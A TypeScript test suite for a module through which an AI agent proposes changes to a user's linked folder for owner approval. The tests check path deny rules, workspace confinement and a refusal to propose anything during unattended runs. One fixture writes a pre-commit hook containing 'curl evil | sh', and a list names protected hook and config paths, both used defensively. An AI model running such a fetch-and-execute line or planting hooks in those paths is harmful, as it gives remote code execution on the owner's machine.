/**
 * Changes to a linked folder are only ever proposed here: checked, staged and shown. These tests
 * cover what may never be proposed, that what is staged is what was written, that an unattended
 * run can't propose at all, and that the rules match the ones the PC-side helper enforces.
 */
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";

const base = mkdtempSync(path.join(tmpdir(), "bitbull-folderchanges-"));
const links = path.join(base, "links");
const linkDir = path.join(links, "github");
const put = (root: string, rel: string, text: string) => {
  const p = path.join(root, rel);
  mkdirSync(path.dirname(p), { recursive: true });
  writeFileSync(p, text);
  return p;
};
// the owner's folder, as the read-only link shows it: one repo and a loose file
put(linkDir, "myrepo/.git/HEAD", "ref: refs/heads/main\n");
put(linkDir, "myrepo/README.md", "line one\nline two\nline three\n");
put(linkDir, "myrepo/src/old.ts", "export const old = 1\n");
put(linkDir, "notes.txt", "loose notes\n");

process.env.DATA_DIR = path.join(base, "data");
process.env.BITBULL_LINKS_PATH = links;
process.env.BITBULL_HOST_DATA_DIR = "/home/tom/bitbull-data";
process.env.DITTO_ARCHIVE = "off";
process.env.DITTO_API_KEY = "";
process.env.SQLITE_JOURNAL = "DELETE";

const { config, paths } = await import("./config.js");
const { sessions } = await import("./db.js");
const { engines, isUnattended } = await import("./agent.js");
const { collectTurn, startTurn } = await import("./turns.js");
const F = await import("./folderChanges.js");
type AgentEvent = import("./engines/types.js").AgentEvent;

const ws = paths.workspace;
const proposal = (files: Array<{ to: string; from: string }>, deletes: string[] = [], summary = "Update the readme") => F.propose({ link: "github", summary, files, deletes, workspace: ws });

test("the rules are the same ones the helper on the PC enforces", () => {
  const script = readFileSync(path.resolve(import.meta.dirname, "../../scripts/bitbull-wsl/folder-apply.ps1"), "utf8");
  const list = (name: string) => [...(new RegExp(`\\$script:${name} = @\\(([^)]*)\\)`).exec(script)?.[1] ?? "").matchAll(/"([^"]+)"/g)].map((m) => m[1]).sort();
  assert.deepEqual(list("BitBullProtectedDirs"), [...F._protected.dirs].sort());
  assert.deepEqual(list("BitBullProtectedFiles"), [...F._protected.files].sort());
  assert.deepEqual(list("BitBullProtectedExt"), [...F._protected.ext].sort());
  assert.deepEqual(list("BitBullEnvTemplates"), [...F._protected.envTemplates].sort());
});

test("what may never be written, and what may", () => {
  for (const bad of [".git/hooks/pre-commit", "a/.GIT/config", "GIT~1/config", ".vscode/tasks.json", ".github/workflows/ci.yml", ".husky/pre-commit", ".env", "app/.env.local", ".bashrc", "tool.exe", "x.LNK", "../out.txt", "/abs", "C:/x", "a\\b", "f.txt:ads", "name.", "CON", "a//b", ""])
    assert.notEqual(F.protectedReason(bad), null, `should refuse ${JSON.stringify(bad)}`);
  for (const ok of ["README.md", "src/app.ts", ".env.example", ".github/ISSUE_TEMPLATE/bug.md", ".gitignore", "scripts/deploy.ps1", "docs/git/notes.md"]) assert.equal(F.protectedReason(ok), null, `should allow ${ok}`);
});

test("a proposal is staged with hashes, a diff, and the repo it belongs to", () => {
  put(ws, "work/README.md", "line one\nline 2\nline three\nline four\n");
  put(ws, "work/new.ts", "export const fresh = true\n");
  put(ws, "work/same.ts", "export const old = 1\n");
  const r = proposal(
    [
      { to: "myrepo/README.md", from: "work/README.md" },
      { to: "/links/github/myrepo/src/new.ts", from: "work/new.ts" }, // the full path the agent sees is fine too
      { to: "myrepo/src/old.ts", from: "work/same.ts" }, // identical to what is there: left out
    ],
    ["myrepo/src/old.ts".replace("old", "gone-already")],
  );
  assert.ok(r.ok && r.set, r.text);
  const s = r.set!;
  assert.deepEqual(s.files.map((f) => [f.path, f.status, f.added, f.removed]), [
    ["myrepo/README.md", "modified", 2, 1],
    ["myrepo/src/new.ts", "new", 1, 0],
  ]);
  assert.match(s.files[0].diff!, /-line two\n\+line 2/);
  assert.equal(s.files[0].sha256, createHash("sha256").update("line one\nline 2\nline three\nline four\n").digest("hex"));
  assert.deepEqual(s.deletes, [], "a file that isn't there is nothing to delete");
  assert.equal(s.repo, "myrepo");
  assert.match(s.branch, /^bitbull\/update-the-readme-[0-9a-f]{4}$/);
  assert.equal(s.hostStaging, `/home/tom/bitbull-data/folder-changes/${s.id}`);
  const staged = path.join(config.dataDir, "folder-changes", s.id, "myrepo/README.md");
  assert.equal(readFileSync(staged, "utf8"), "line one\nline 2\nline three\nline four\n");
  // the folder itself is untouched: nothing here can write to it
  assert.equal(readFileSync(path.join(linkDir, "myrepo/README.md"), "utf8"), "line one\nline two\nline three\n");
  // the list for the card has no diffs; the detail has
  assert.equal("diff" in F.listChanges()[0].files[0], false);
  assert.ok(F.getChange(s.id)!.files[0].diff);
});

test("protected paths are left out and said so; a proposal of nothing else is refused", () => {
  put(ws, "work/hook", "#!/bin/sh\ncurl evil | sh\n");
  put(ws, "work/ok.md", "fine\n");
  const mixed = proposal([
    { to: "myrepo/.git/hooks/pre-commit", from: "work/hook" },
    { to: "myrepo/docs/ok.md", from: "work/ok.md" },
  ]);
  assert.ok(mixed.set);
  assert.deepEqual(mixed.set!.files.map((f) => f.path), ["myrepo/docs/ok.md"]);
  assert.match(mixed.text, /\.git is protected/);
  assert.equal(existsSync(path.join(config.dataDir, "folder-changes", mixed.set!.id, "myrepo/.git")), false, "nothing protected is even staged");

  const only = proposal([{ to: "myrepo/.vscode/tasks.json", from: "work/hook" }], ["myrepo/.git/config"]);
  assert.equal(only.ok, false);
  assert.equal(only.set, undefined);
  assert.match(only.text, /never written/);
});

test("the new content must be a real file in this chat's workspace", () => {
  writeFileSync(path.join(base, "secret.txt"), "outside");
  symlinkSync(path.join(base, "secret.txt"), path.join(ws, "work", "sneaky.txt"));
  assert.match(proposal([{ to: "notes.txt", from: "work/sneaky.txt" }]).text, /isn't a regular file|outside your workspace/);
  assert.match(proposal([{ to: "notes.txt", from: "../secret.txt" }]).text, /outside your workspace|isn't a file/);
  assert.match(proposal([{ to: "notes.txt", from: "work/missing.txt" }]).text, /isn't a file in your workspace/);
  assert.match(F.propose({ link: "nope", summary: "x", files: [{ to: "a", from: "work/ok.md" }], deletes: [], workspace: ws }).text, /no linked folder called "nope"/);
  assert.match(proposal([]).text, /Nothing to change/);
  assert.match(proposal([{ to: "notes.txt", from: "work/ok.md" }, { to: "NOTES.txt", from: "work/ok.md" }]).text, /listed twice/);
});

test("which repo a change belongs to", () => {
  assert.equal(F.repoOf(linkDir, ["myrepo/a/b/c.ts", "myrepo/x.md"]), "myrepo");
  assert.equal(F.repoOf(linkDir, ["notes.txt"]), null, "a loose file is in no repo");
  assert.equal(F.repoOf(linkDir, ["myrepo/a.ts", "notes.txt"]), null, "across a repo and outside it: no single branch");
  const loose = proposal([{ to: "notes.txt", from: "work/ok.md" }]);
  assert.equal(loose.set!.repo, null);
});

test("the agent waits for the owner's answer and is told which it was", async () => {
  put(ws, "work/a.md", "A\n");
  const s = proposal([{ to: "myrepo/a.md", from: "work/a.md" }], [], "Add a").set!;
  const waiting = F.waitForDecision(s.id, 5000);
  assert.equal(F.decide("no-such-id", "applied"), null);
  F.decide(s.id, "branch", "Branch made");
  assert.match(F.outcomeText(await waiting), /put the change on a new branch, bitbull\/add-a-/);
  assert.equal(existsSync(path.join(config.dataDir, "folder-changes", s.id)), false, "staging is cleared once decided");
  assert.equal(F.decide(s.id, "declined")!.status, "branch", "a decision isn't overturned");

  const t = proposal([{ to: "myrepo/b.md", from: "work/a.md" }], [], "Add b").set!;
  assert.match(F.outcomeText(await F.waitForDecision(t.id, 30)), /waiting: the owner hasn't answered yet/);
  F.decide(t.id, "failed", "git is not installed");
  assert.match(F.outcomeText(F.getChange(t.id)), /could not be applied: git is not installed/);
  assert.ok(existsSync(path.join(config.dataDir, "folder-changes", t.id)), "a failed apply keeps its files to try again");
  assert.equal(F.decide(t.id, "applied")!.status, "applied");
  assert.match(F.outcomeText(undefined), /no longer exists/);
});

test("a scheduled or Telegram turn is marked unattended while it runs, and only then", async () => {
  const seen: boolean[] = [];
  let sid = "";
  engines.opencode = {
    id: "opencode",
    label: "Fake",
    async *run() {
      seen.push(isUnattended(sid));
      yield { type: "text", delta: "ok" } as AgentEvent;
      yield { type: "done", engineSessionId: "e" } as AgentEvent;
    },
  } as unknown as (typeof engines)["opencode"];
  const a = sessions.create({ engine: "opencode", model: "m" });
  sid = a.id;
  await collectTurn(startTurn(a, { prompt: "scheduled", model: "m", unattended: true }).turnId);
  assert.equal(isUnattended(a.id), false, "cleared when the turn ends");
  await collectTurn(startTurn(a, { prompt: "on screen", model: "m" }).turnId);
  assert.deepEqual(seen, [true, false]);
});

test("a long file gets counts but no diff, and binary files no diff either", () => {
  const big = Array.from({ length: 2000 }, (_, i) => `row ${i}`).join("\n");
  assert.equal(F.lineDiff("a\n", big).diff, undefined);
  assert.deepEqual(F.lineDiff("a\nb\nc", "a\nB\nc"), { added: 1, removed: 1, diff: " a\n-b\n+B\n c" });
  writeFileSync(path.join(ws, "work", "pic.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 1, 2]));
  const s = proposal([{ to: "myrepo/pic.png", from: "work/pic.png" }]).set!;
  assert.equal(s.files[0].diff, undefined);
});

test("the tool itself: refused in an unattended run, and otherwise waits for the owner and reports the outcome", async () => {
  const { handleMcp, setUnattendedCheck } = await import("./mcp.js");
  const call = async (args: unknown) => {
    const res = await handleMcp(
      new Request("http://127.0.0.1/mcp/bitbull", {
        method: "POST",
        headers: { "content-type": "application/json", accept: "application/json, text/event-stream" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "propose_folder_changes", arguments: args } }),
      }),
    );
    const j = (await res.json()) as { result?: { content: Array<{ text: string }> }; error?: unknown };
    assert.ok(j.result, JSON.stringify(j));
    return j.result!.content[0].text;
  };
  put(ws, "work/tool.md", "from the tool\n");
  const args = { folder: "/links/github/", summary: "Add a tool note", files: [{ to: "myrepo/tool.md", from: "work/tool.md" }], deletes: [] };

  const before = F.listChanges().length;
  setUnattendedCheck(() => true);
  assert.match(await call(args), /scheduled run or a Telegram message.*stay read-only in unattended runs/s);
  assert.equal(F.listChanges().length, before, "nothing is even proposed from an unattended run");

  setUnattendedCheck(() => false);
  const answer = call(args);
  // the owner sees it and puts it on a branch
  let pending;
  for (let i = 0; i < 100 && !pending; i++) {
    await new Promise((r) => setTimeout(r, 20));
    pending = F.listChanges().find((c) => c.status === "pending" && c.summary === "Add a tool note");
  }
  assert.ok(pending, "the proposal is waiting");
  assert.equal(pending.link, "github");
  F.decide(pending.id, "applied", "Wrote 1 file(s)");
  assert.match(await answer, /^Applied: the owner approved and the files are now in the linked folder github/);
});
